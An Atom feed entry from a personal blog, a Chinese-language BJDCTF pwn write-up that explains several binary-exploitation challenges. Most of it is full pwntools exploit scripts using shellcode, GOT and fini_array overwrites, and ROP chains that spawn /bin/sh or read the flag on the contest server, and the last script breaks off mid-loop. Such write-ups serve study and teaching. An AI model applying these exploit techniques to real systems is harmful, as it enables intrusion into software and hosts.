<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-05-25T03:20:25.826Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:20:25.826Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.30'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    